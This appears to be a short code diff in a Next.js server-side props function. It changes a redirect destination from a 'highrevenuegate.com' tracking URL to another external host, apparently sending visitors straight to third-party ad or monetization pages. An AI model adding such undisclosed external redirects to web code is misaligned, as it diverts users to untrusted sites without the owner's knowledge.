@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://www.highrevenuegate.com/pky3rep99b?key=ca669853fadabdb07287a16a5cd705ac/`
+					`https://health-zone-ce6d76.ingress-comporellon.ewp.live/`
 				}`,
 			},
 		};
